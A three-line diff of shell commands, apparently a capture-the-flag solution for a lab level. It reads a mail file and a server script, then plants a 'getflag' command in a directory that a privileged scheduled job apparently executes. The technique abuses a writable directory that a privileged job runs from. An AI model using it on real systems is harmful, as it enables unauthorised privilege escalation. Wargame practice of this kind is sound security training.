@@ -1,0 +1,3 @@
+cat /var/mail/level05
+cat /usr/sbin/openarenaserver
+echo "getflag>/opt/openarenaserver/flag" > /opt/openarenaserver/pwn
